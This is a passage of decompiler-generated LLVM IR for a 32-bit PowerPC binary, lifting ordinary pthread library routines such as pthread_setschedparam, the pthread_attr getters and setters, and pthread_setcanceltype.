  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10014744 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10014748 = add i32 %v1_10014744, ptrtoint (i32* @global_var_10040d60.1027 to i32)
  store i32 %arg1, i32* @r29, align 4
  store i32 %tmp, i32* %r28.global-to-local, align 4
  store i32 %v2_10014748, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268519268, i32* @lr, align 4
  %v0_10014760 = call i32 @__pthread_lock()
  store i32 %v0_10014760, i32* %r3.global-to-local, align 4
  %v0_10014764 = load i32, i32* @r31, align 4
  %v1_10014764 = add i32 %v0_10014764, 8
  %v2_10014764 = inttoptr i32 %v1_10014764 to i32*
  %v3_10014764 = load i32, i32* %v2_10014764, align 4
  store i32 %v0_10014764, i32* @r3, align 4
  %v3_1001476c = icmp eq i32 %v3_10014764, 0
  br i1 %v3_1001476c, label %dec_label_pc_10014780, label %dec_label_pc_10014774

dec_label_pc_10014774:                            ; preds = %entry
  %v1_10014774 = add i32 %v3_10014764, 16
  %v2_10014774 = inttoptr i32 %v1_10014774 to i32*
  %v3_10014774 = load i32, i32* %v2_10014774, align 4
  %v0_10014778 = load i32, i32* @r29, align 4
  %v4_10014778 = icmp eq i32 %v0_10014778, %v3_10014774
  br i1 %v4_10014778, label %dec_label_pc_1001478c, label %dec_label_pc_10014780

dec_label_pc_10014780:                            ; preds = %dec_label_pc_10014774, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_10014784.1028 to i32), i32* @lr, align 4
  %v0_10014780 = call i32 @__pthread_unlock()
  store i32 3, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100147d4

dec_label_pc_1001478c:                            ; preds = %dec_label_pc_10014774
  %v1_1001478c = add i32 %v3_10014764, 20
  %v2_1001478c = inttoptr i32 %v1_1001478c to i32*
  %v3_1001478c = load i32, i32* %v2_1001478c, align 4
  store i32 %v3_1001478c, i32* %r29.global-to-local, align 4
  store i32 %v0_10014764, i32* @r3, align 4
  store i32 268519320, i32* @lr, align 4
  %v0_10014794 = call i32 @__pthread_unlock()
  store i32 %v3_1001478c, i32* %r3.global-to-local, align 4
  store i32 268519328, i32* @lr, align 4
  %v1_1001479c = call i32 @sched_getscheduler(i32 %v3_1001478c)
  %v0_100147a0 = load i32, i32* @r30, align 4
  store i32 %v1_1001479c, i32* @r31, align 4
  %v0_100147a8 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100147a8, i32* %r3.global-to-local, align 4
  %v3_100147ac = icmp eq i32 %v1_1001479c, -1
  br i1 %v3_100147ac, label %dec_label_pc_100147c4, label %dec_label_pc_100147b4

dec_label_pc_100147b4:                            ; preds = %dec_label_pc_1001478c
  store i32 268519352, i32* @lr, align 4
  %v2_100147b4 = call i32 @sched_getparam(i32 %v0_100147a8, i32 %v0_100147a0)
  %v3_100147b8 = icmp eq i32 %v2_100147b4, -1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_100147b8, label %dec_label_pc_100147c4, label %dec_label_pc_100147d0

dec_label_pc_100147c4:                            ; preds = %dec_label_pc_100147b4, %dec_label_pc_1001478c
  %v0_100147c4 = call i32 @__errno_location()
  store i32 %v0_100147c4, i32* %r3.global-to-local, align 4
  %v1_100147c8 = inttoptr i32 %v0_100147c4 to i32*
  %v2_100147c8 = load i32, i32* %v1_100147c8, align 4
  store i32 %v2_100147c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100147d4

dec_label_pc_100147d0:                            ; preds = %dec_label_pc_100147b4
  %v0_100147d0 = load i32, i32* @r31, align 4
  %v1_100147d0 = load i32, i32* %r28.global-to-local, align 4
  %v2_100147d0 = inttoptr i32 %v1_100147d0 to i32*
  store i32 %v0_100147d0, i32* %v2_100147d0, align 4
  %v0_100147e4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100147d4

dec_label_pc_100147d4:                            ; preds = %dec_label_pc_100147c4, %dec_label_pc_10014780, %dec_label_pc_100147d0
  %v0_100147e4 = phi i32 [ %v2_100147c8, %dec_label_pc_100147c4 ], [ 3, %dec_label_pc_10014780 ], [ %v0_100147e4.pre, %dec_label_pc_100147d0 ]
  ret i32 %v0_100147e4

; uselistorder directives
  uselistorder i32 %v3_1001478c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100147d4, { 2, 0, 1 }
}

define i32 @pthread_setschedparam(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %v1_10014800 = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10014804 = add i32 %v1_10014800, ptrtoint (i32* @global_var_10040d60.1027 to i32)
  store i32 %arg1, i32* @r29, align 4
  store i32 %arg2, i32* %r28.global-to-local, align 4
  store i32 %v2_10014804, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %tmp, i32* %r27.global-to-local, align 4
  store i32 268519456, i32* @lr, align 4
  %v0_1001481c = call i32 @__pthread_lock()
  %v0_10014820 = load i32, i32* @r31, align 4
  %v1_10014820 = add i32 %v0_10014820, 8
  %v2_10014820 = inttoptr i32 %v1_10014820 to i32*
  %v3_10014820 = load i32, i32* %v2_10014820, align 4
  store i32 %v3_10014820, i32* %r30.global-to-local, align 4
  store i32 %v0_10014820, i32* @r3, align 4
  %v3_10014828 = icmp eq i32 %v3_10014820, 0
  br i1 %v3_10014828, label %dec_label_pc_10014844, label %dec_label_pc_10014830

dec_label_pc_10014830:                            ; preds = %entry
  %v1_10014830 = add i32 %v3_10014820, 16
  %v2_10014830 = inttoptr i32 %v1_10014830 to i32*
  %v3_10014830 = load i32, i32* %v2_10014830, align 4
  %v0_1001483c = load i32, i32* @r29, align 4
  %v4_1001483c = icmp eq i32 %v0_1001483c, %v3_10014830
  br i1 %v4_1001483c, label %dec_label_pc_10014850, label %dec_label_pc_10014844

dec_label_pc_10014844:                            ; preds = %dec_label_pc_10014830, %entry
  store i32 ptrtoint ([3 x i8]* @global_var_10014848.1029 to i32), i32* @lr, align 4
  %v0_10014844 = call i32 @__pthread_unlock()
  br label %dec_label_pc_100148ac

dec_label_pc_10014850:                            ; preds = %dec_label_pc_10014830
  store i32 268519512, i32* @lr, align 4
  %v0_10014854 = call i32 @sched_setscheduler()
  %v0_10014858 = load i32, i32* %r28.global-to-local, align 4
  %v3_1001485c = icmp eq i32 %v0_10014854, -1
  %v0_10014864 = load i32, i32* @r31, align 4
  store i32 %v0_10014864, i32* @r3, align 4
  br i1 %v3_1001485c, label %dec_label_pc_1001486c, label %dec_label_pc_1001487c

dec_label_pc_1001486c:                            ; preds = %dec_label_pc_10014850
  store i32 268519536, i32* @lr, align 4
  %v0_1001486c = call i32 @__pthread_unlock()
  %v0_10014870 = call i32 @__errno_location()
  %v1_10014874 = inttoptr i32 %v0_10014870 to i32*
  %v2_10014874 = load i32, i32* %v1_10014874, align 4
  br label %dec_label_pc_100148ac

dec_label_pc_1001487c:                            ; preds = %dec_label_pc_10014850
  %v3_10014858 = icmp eq i32 %v0_10014858, 0
  br i1 %v3_10014858, label %dec_label_pc_10014884, label %dec_label_pc_10014880

dec_label_pc_10014880:                            ; preds = %dec_label_pc_1001487c
  %v0_10014880 = load i32, i32* %r27.global-to-local, align 4
  %v1_10014880 = inttoptr i32 %v0_10014880 to i32*
  %v2_10014880 = load i32, i32* %v1_10014880, align 4
  br label %dec_label_pc_10014884

dec_label_pc_10014884:                            ; preds = %dec_label_pc_1001487c, %dec_label_pc_10014880
  %v0_10014884 = phi i32 [ 0, %dec_label_pc_1001487c ], [ %v2_10014880, %dec_label_pc_10014880 ]
  %v1_10014884 = load i32, i32* %r30.global-to-local, align 4
  %v2_10014884 = add i32 %v1_10014884, 24
  %v3_10014884 = inttoptr i32 %v2_10014884 to i32*
  store i32 %v0_10014884, i32* %v3_10014884, align 4
  store i32 268519564, i32* @lr, align 4
  %v0_10014888 = call i32 @__pthread_unlock()
  %v3_10014890 = load i32, i32* @global_var_100450e4.985, align 4
  %v1_10014898 = icmp slt i32 %v3_10014890, 0
  br i1 %v1_10014898, label %dec_label_pc_100148ac, label %dec_label_pc_100148a0

dec_label_pc_100148a0:                            ; preds = %dec_label_pc_10014884
  %v0_100148a0 = load i32, i32* %r30.global-to-local, align 4
  %v1_100148a0 = add i32 %v0_100148a0, 24
  %v2_100148a0 = inttoptr i32 %v1_100148a0 to i32*
  %v3_100148a0 = load i32, i32* %v2_100148a0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100148a8.1030 to i32), i32* @lr, align 4
  %v1_100148a4 = call i32 @__pthread_manager_adjust_prio(i32 %v3_100148a0)
  br label %dec_label_pc_100148ac

dec_label_pc_100148ac:                            ; preds = %dec_label_pc_10014884, %dec_label_pc_1001486c, %dec_label_pc_10014844, %dec_label_pc_100148a0
  %v0_100148bc = phi i32 [ 0, %dec_label_pc_10014884 ], [ %v2_10014874, %dec_label_pc_1001486c ], [ 3, %dec_label_pc_10014844 ], [ 0, %dec_label_pc_100148a0 ]
  ret i32 %v0_100148bc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100148ac, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10014884, { 1, 0 }
}

define i32 @pthread_attr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_attr_setdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_100148c8 = icmp ugt i32 %arg2, 1
  br i1 %v2_100148c8, label %dec_label_pc_100148dc, label %dec_label_pc_100148d4

dec_label_pc_100148d4:                            ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_100148dc

dec_label_pc_100148dc:                            ; preds = %entry, %dec_label_pc_100148d4
  %v0_100148dc = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_100148d4 ]
  ret i32 %v0_100148dc

; uselistorder directives
  uselistorder label %dec_label_pc_100148dc, { 1, 0 }
}

define i32 @__GI_pthread_attr_getdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_100148e4 = load i32, i32* %arg1, align 4
  %v2_100148ec = inttoptr i32 %arg2 to i32*
  store i32 %v2_100148e4, i32* %v2_100148ec, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedpolicy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_100148f4 = icmp ugt i32 %arg2, 2
  br i1 %v2_100148f4, label %dec_label_pc_10014908, label %dec_label_pc_10014900

dec_label_pc_10014900:                            ; preds = %entry
  %v2_10014900 = add i32 %arg1, 4
  %v3_10014900 = inttoptr i32 %v2_10014900 to i32*
  store i32 %arg2, i32* %v3_10014900, align 4
  br label %dec_label_pc_10014908

dec_label_pc_10014908:                            ; preds = %entry, %dec_label_pc_10014900
  %v0_10014908 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10014900 ]
  ret i32 %v0_10014908

; uselistorder directives
  uselistorder label %dec_label_pc_10014908, { 1, 0 }
}

define i32 @pthread_attr_getschedpolicy(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10014910 = add i32 %arg1, 4
  %v2_10014910 = inttoptr i32 %v1_10014910 to i32*
  %v3_10014910 = load i32, i32* %v2_10014910, align 4
  store i32 %v3_10014910, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setinheritsched(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10014920 = icmp ugt i32 %arg2, 1
  br i1 %v2_10014920, label %dec_label_pc_10014934, label %dec_label_pc_1001492c

dec_label_pc_1001492c:                            ; preds = %entry
  %v2_1001492c = add i32 %arg1, 12
  %v3_1001492c = inttoptr i32 %v2_1001492c to i32*
  store i32 %arg2, i32* %v3_1001492c, align 4
  br label %dec_label_pc_10014934

dec_label_pc_10014934:                            ; preds = %entry, %dec_label_pc_1001492c
  %v0_10014934 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_1001492c ]
  ret i32 %v0_10014934

; uselistorder directives
  uselistorder label %dec_label_pc_10014934, { 1, 0 }
}

define i32 @pthread_attr_getinheritsched(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_1001493c = add i32 %arg1, 12
  %v2_1001493c = inttoptr i32 %v1_1001493c to i32*
  %v3_1001493c = load i32, i32* %v2_1001493c, align 4
  store i32 %v3_1001493c, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setscope(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_1001494c = icmp eq i32 %arg2, 0
  %v1_10014950 = xor i32 %arg2, 1
  %tmp = icmp slt i32 %arg2, 0
  %v1_10014954 = zext i1 %tmp to i32
  %v2_10014954 = ashr i32 %arg2, 31
  %v3_10014954 = and i32 %v2_10014954, -2
  %v4_10014954 = or i32 %v3_10014954, %v1_10014954
  %v2_10014958 = xor i32 %v1_10014950, %v4_10014954
  %v2_1001495c = sub i32 %v4_10014954, %v2_10014958
  %tmp2 = icmp slt i32 %v2_1001495c, 0
  %v1_10014960 = zext i1 %tmp2 to i32
  %v2_10014960 = ashr i32 %v2_1001495c, 31
  %v3_10014960 = and i32 %v2_10014960, -74
  %v2_10014968 = or i32 %v3_10014960, %v1_10014960
  %v1_1001496c = add nsw i32 %v2_10014968, 95
  br i1 %v3_1001494c, label %dec_label_pc_10014974, label %dec_label_pc_1001497c

dec_label_pc_10014974:                            ; preds = %entry
  %v2_10014974 = add i32 %arg1, 16
  %v3_10014974 = inttoptr i32 %v2_10014974 to i32*
  store i32 0, i32* %v3_10014974, align 4
  br label %dec_label_pc_1001497c

dec_label_pc_1001497c:                            ; preds = %entry, %dec_label_pc_10014974
  %v0_1001497c = phi i32 [ %v1_1001496c, %entry ], [ 0, %dec_label_pc_10014974 ]
  ret i32 %v0_1001497c

; uselistorder directives
  uselistorder i32 %v2_1001495c, { 1, 0 }
  uselistorder i32 %v4_10014954, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1001497c, { 1, 0 }
}

define i32 @pthread_attr_getscope(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10014984 = add i32 %arg1, 16
  %v2_10014984 = inttoptr i32 %v1_10014984 to i32*
  %v3_10014984 = load i32, i32* %v2_10014984, align 4
  store i32 %v3_10014984, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_getguardsize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_10014994 = add i32 %arg1, 20
  %v2_10014994 = inttoptr i32 %v1_10014994 to i32*
  %v3_10014994 = load i32, i32* %v2_10014994, align 4
  store i32 %v3_10014994, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstackaddr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100149a8 = add i32 %arg1, 28
  %v3_100149a8 = inttoptr i32 %v2_100149a8 to i32*
  store i32 %arg2, i32* %v3_100149a8, align 4
  %v0_100149ac = load i32, i32* %r0.global-to-local, align 4
  %v2_100149ac = add i32 %arg1, 24
  %v3_100149ac = inttoptr i32 %v2_100149ac to i32*
  store i32 %v0_100149ac, i32* %v3_100149ac, align 4
  ret i32 0
}

define i32 @__pthread_attr_getstackaddr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_100149b8 = add i32 %arg1, 28
  %v2_100149b8 = inttoptr i32 %v1_100149b8 to i32*
  %v3_100149b8 = load i32, i32* %v2_100149b8, align 4
  store i32 %v3_100149b8, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_attr_setstacksize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg2, 16384
  br i1 %tmp, label %dec_label_pc_100149dc, label %dec_label_pc_100149d4

dec_label_pc_100149d4:                            ; preds = %entry
  %v2_100149d4 = add i32 %arg1, 32
  %v3_100149d4 = inttoptr i32 %v2_100149d4 to i32*
  store i32 %arg2, i32* %v3_100149d4, align 4
  br label %dec_label_pc_100149dc

dec_label_pc_100149dc:                            ; preds = %entry, %dec_label_pc_100149d4
  %v0_100149dc = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_100149d4 ]
  ret i32 %v0_100149dc

; uselistorder directives
  uselistorder label %dec_label_pc_100149dc, { 1, 0 }
}

define i32 @__pthread_attr_getstacksize(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_100149e4 = add i32 %arg1, 32
  %v2_100149e4 = inttoptr i32 %v1_100149e4 to i32*
  %v3_100149e4 = load i32, i32* %v2_100149e4, align 4
  store i32 %v3_100149e4, i32* %arg2, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_100149f4 = load i32, i32* @lr, align 4
  store i32 %v0_100149f4, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10014a0c.1031 to i32), i32* @lr, align 4
  %v0_10014a08 = call i32 @__GI_getpagesize()
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10014a14 = sub i32 2097152, %v0_10014a08
  store i32 %v2_10014a14, i32* %r0.global-to-local, align 4
  %v2_10014a18 = add i32 %tmp, 20
  %v3_10014a18 = inttoptr i32 %v2_10014a18 to i32*
  store i32 %v0_10014a08, i32* %v3_10014a18, align 4
  %v0_10014a1c = load i32, i32* %r0.global-to-local, align 4
  %v1_10014a1c = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a1c = add i32 %v1_10014a1c, 32
  %v3_10014a1c = inttoptr i32 %v2_10014a1c to i32*
  store i32 %v0_10014a1c, i32* %v3_10014a1c, align 4
  %v1_10014a24 = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a24 = add i32 %v1_10014a24, 12
  %v3_10014a24 = inttoptr i32 %v2_10014a24 to i32*
  store i32 1, i32* %v3_10014a24, align 4
  %v0_10014a2c = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a2c = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a2c = add i32 %v1_10014a2c, 24
  %v3_10014a2c = inttoptr i32 %v2_10014a2c to i32*
  store i32 %v0_10014a2c, i32* %v3_10014a2c, align 4
  %v0_10014a30 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a30 = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a30 = inttoptr i32 %v1_10014a30 to i32*
  store i32 %v0_10014a30, i32* %v2_10014a30, align 4
  %v0_10014a34 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a34 = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a34 = add i32 %v1_10014a34, 4
  %v3_10014a34 = inttoptr i32 %v2_10014a34 to i32*
  store i32 %v0_10014a34, i32* %v3_10014a34, align 4
  %v0_10014a38 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a38 = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a38 = add i32 %v1_10014a38, 8
  %v3_10014a38 = inttoptr i32 %v2_10014a38 to i32*
  store i32 %v0_10014a38, i32* %v3_10014a38, align 4
  %v0_10014a3c = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a3c = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a3c = add i32 %v1_10014a3c, 16
  %v3_10014a3c = inttoptr i32 %v2_10014a3c to i32*
  store i32 %v0_10014a3c, i32* %v3_10014a3c, align 4
  %v0_10014a40 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014a40 = load i32, i32* %r29.global-to-local, align 4
  %v2_10014a40 = add i32 %v1_10014a40, 28
  %v3_10014a40 = inttoptr i32 %v2_10014a40 to i32*
  store i32 %v0_10014a40, i32* %v3_10014a40, align 4
  store i32 %v0_100149f4, i32* %r0.global-to-local, align 4
  ret i32 0
}

define i32 @__pthread_attr_setguardsize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268520052, i32* @lr, align 4
  %v0_10014a70 = call i32 @__GI_getpagesize()
  %v1_10014a74 = add i32 %arg1, 32
  %v2_10014a74 = inttoptr i32 %v1_10014a74 to i32*
  %v3_10014a74 = load i32, i32* %v2_10014a74, align 4
  %v2_10014a78 = add i32 %v0_10014a70, -1
  %v1_10014a80 = add i32 %v2_10014a78, %arg2
  %v2_10014a84 = urem i32 %v1_10014a80, %v0_10014a70
  %v2_10014a88 = sub i32 %v1_10014a80, %v2_10014a84
  %v2_10014a8c = icmp ult i32 %v2_10014a88, %v3_10014a74
  br i1 %v2_10014a8c, label %dec_label_pc_10014a94, label %dec_label_pc_10014a9c

dec_label_pc_10014a94:                            ; preds = %entry
  %v2_10014a94 = add i32 %arg1, 20
  %v3_10014a94 = inttoptr i32 %v2_10014a94 to i32*
  store i32 %v2_10014a88, i32* %v3_10014a94, align 4
  br label %dec_label_pc_10014a9c

dec_label_pc_10014a9c:                            ; preds = %entry, %dec_label_pc_10014a94
  %v0_10014aa0 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10014a94 ]
  ret i32 %v0_10014aa0

; uselistorder directives
  uselistorder i32 %v0_10014a70, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10014a9c, { 1, 0 }
}

define i32 @__GI_pthread_attr_getschedparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 4, i32* @r5, align 4
  %v1_10014ac4 = add i32 %arg1, 8
  store i32 %arg2, i32* @r3, align 4
  store i32 %v1_10014ac4, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10014ad4.1032 to i32), i32* @lr, align 4
  %v0_10014ad0 = call i32 @memcpy()
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedparam(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r31, align 4
  store i32 %tmp, i32* %r30.global-to-local, align 4
  %v1_10014b00 = add i32 %arg1, 4
  %v2_10014b00 = inttoptr i32 %v1_10014b00 to i32*
  %v3_10014b00 = load i32, i32* %v2_10014b00, align 4
  store i32 268520200, i32* @lr, align 4
  %v1_10014b04 = call i32 @sched_get_priority_max(i32 %v3_10014b00)
  store i32 %v1_10014b04, i32* %r29.global-to-local, align 4
  %v0_10014b0c = load i32, i32* @r31, align 4
  %v1_10014b0c = add i32 %v0_10014b0c, 4
  %v2_10014b0c = inttoptr i32 %v1_10014b0c to i32*
  %v3_10014b0c = load i32, i32* %v2_10014b0c, align 4
  store i32 268520212, i32* @lr, align 4
  %v1_10014b10 = call i32 @sched_get_priority_min(i32 %v3_10014b0c)
  %v0_10014b14 = load i32, i32* %r30.global-to-local, align 4
  %v1_10014b14 = inttoptr i32 %v0_10014b14 to i32*
  %v2_10014b14 = load i32, i32* %v1_10014b14, align 4
  %v2_10014b1c = icmp slt i32 %v2_10014b14, %v1_10014b10
  br i1 %v2_10014b1c, label %dec_label_pc_10014b40, label %dec_label_pc_10014b28

dec_label_pc_10014b28:                            ; preds = %entry
  %v1_10014b20 = load i32, i32* %r29.global-to-local, align 4
  %v3_10014b20 = icmp sgt i32 %v2_10014b14, %v1_10014b20
  %v0_10014b28 = load i32, i32* @r31, align 4
  %v1_10014b28 = add i32 %v0_10014b28, 8
  store i32 %v1_10014b28, i32* @r3, align 4
  store i32 %v0_10014b14, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  br i1 %v3_10014b20, label %dec_label_pc_10014b40, label %dec_label_pc_10014b38

dec_label_pc_10014b38:                            ; preds = %dec_label_pc_10014b28
  store i32 ptrtoint ([3 x i8]* @global_var_10014b3c.1033 to i32), i32* @lr, align 4
  %v0_10014b38 = call i32 @memcpy()
  br label %dec_label_pc_10014b40

dec_label_pc_10014b40:                            ; preds = %dec_label_pc_10014b28, %entry, %dec_label_pc_10014b38
  %v0_10014b44 = phi i32 [ 22, %dec_label_pc_10014b28 ], [ 22, %entry ], [ 0, %dec_label_pc_10014b38 ]
  ret i32 %v0_10014b44

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10014b40, { 2, 0, 1 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %v3_10014b58 = icmp ugt i8 %arg1, 1
  %v0_10014b5c = load i32, i32* @lr, align 4
  store i32 %v0_10014b5c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r11, align 4
  %v0_10014b68 = load i32, i32* @r2, align 4
  store i32 %v0_10014b68, i32* %r9.global-to-local, align 4
  br i1 %v3_10014b58, label %dec_label_pc_10014bbc, label %dec_label_pc_10014b78

dec_label_pc_10014b78:                            ; preds = %entry
  %v3_10014b78 = icmp eq i32 %arg2, 0
  br i1 %v3_10014b78, label %dec_label_pc_10014b88, label %dec_label_pc_10014b80

dec_label_pc_10014b80:                            ; preds = %dec_label_pc_10014b78
  %v1_10014b80 = add i32 %v0_10014b68, 65
  %v2_10014b80 = inttoptr i32 %v1_10014b80 to i8*
  %v3_10014b80 = load i8, i8* %v2_10014b80, align 1
  %v4_10014b80 = zext i8 %v3_10014b80 to i32
  store i32 %v4_10014b80, i32* %r0.global-to-local, align 4
  %v2_10014b84 = inttoptr i32 %arg2 to i32*
  store i32 %v4_10014b80, i32* %v2_10014b84, align 4
  %v0_10014b88.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10014b8c.pre = load i32, i32* @r11, align 4
  %extract.t4 = trunc i32 %v0_10014b8c.pre to i8
  br label %dec_label_pc_10014b88

dec_label_pc_10014b88:                            ; preds = %dec_label_pc_10014b78, %dec_label_pc_10014b80
  %v0_10014b8c.off0 = phi i8 [ %arg1, %dec_label_pc_10014b78 ], [ %extract.t4, %dec_label_pc_10014b80 ]
  %v2_10014b8c = phi i32 [ %v0_10014b68, %dec_label_pc_10014b78 ], [ %v0_10014b88.pre, %dec_label_pc_10014b80 ]
  %v1_10014b88 = add i32 %v2_10014b8c, 66
  %v2_10014b88 = inttoptr i32 %v1_10014b88 to i8*
  %v3_10014b88 = load i8, i8* %v2_10014b88, align 1
  %v4_10014b88 = zext i8 %v3_10014b88 to i32
  store i32 %v4_10014b88, i32* %r0.global-to-local, align 4
  %v3_10014b8c = add i32 %v2_10014b8c, 65
  %v4_10014b8c = inttoptr i32 %v3_10014b8c to i8*
  store i8 %v0_10014b8c.off0, i8* %v4_10014b8c, align 1
  %v0_10014b90 = load i32, i32* %r0.global-to-local, align 4
  %v3_10014b90 = icmp eq i32 %v0_10014b90, 0
  br i1 %v3_10014b90, label %dec_label_pc_10014bb8, label %dec_label_pc_10014b98

dec_label_pc_10014b98:                            ; preds = %dec_label_pc_10014b88
  %v0_10014b98 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014b98 = add i32 %v0_10014b98, 64
  %v2_10014b98 = inttoptr i32 %v1_10014b98 to i32*
  %v3_10014b98 = load i32, i32* %v2_10014b98, align 4
  store i32 %v3_10014b98, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r9.global-to-local, align 4
  %v1_10014ba0 = call i32 @__asm_rlwinm(i32 %v3_10014b98, i32 0, i32 0, i32 15)
  store i32 %v1_10014ba0, i32* %r0.global-to-local, align 4
  %v4_10014ba4 = icmp eq i32 %v1_10014ba0, 65536
  br i1 %v4_10014ba4, label %dec_label_pc_10014bac, label %dec_label_pc_10014bb8

dec_label_pc_10014bac:                            ; preds = %dec_label_pc_10014b98
  %v0_10014bb4 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10014bb8

dec_label_pc_10014bb8:                            ; preds = %dec_label_pc_10014b98, %dec_label_pc_10014b88, %dec_label_pc_10014bac
  br label %dec_label_pc_10014bbc

dec_label_pc_10014bbc:                            ; preds = %entry, %dec_label_pc_10014bb8
  %v0_10014bc8 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10014bb8 ]
  store i32 %v0_10014b5c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10014bc8

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10014bbc, { 1, 0 }
  uselistorder label %dec_label_pc_10014bb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014b88, { 1, 0 }
}

define i32 @pthread_cancel(i32 %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10040d60.1027 to i32), i32* %r9.global-to-local, align 4
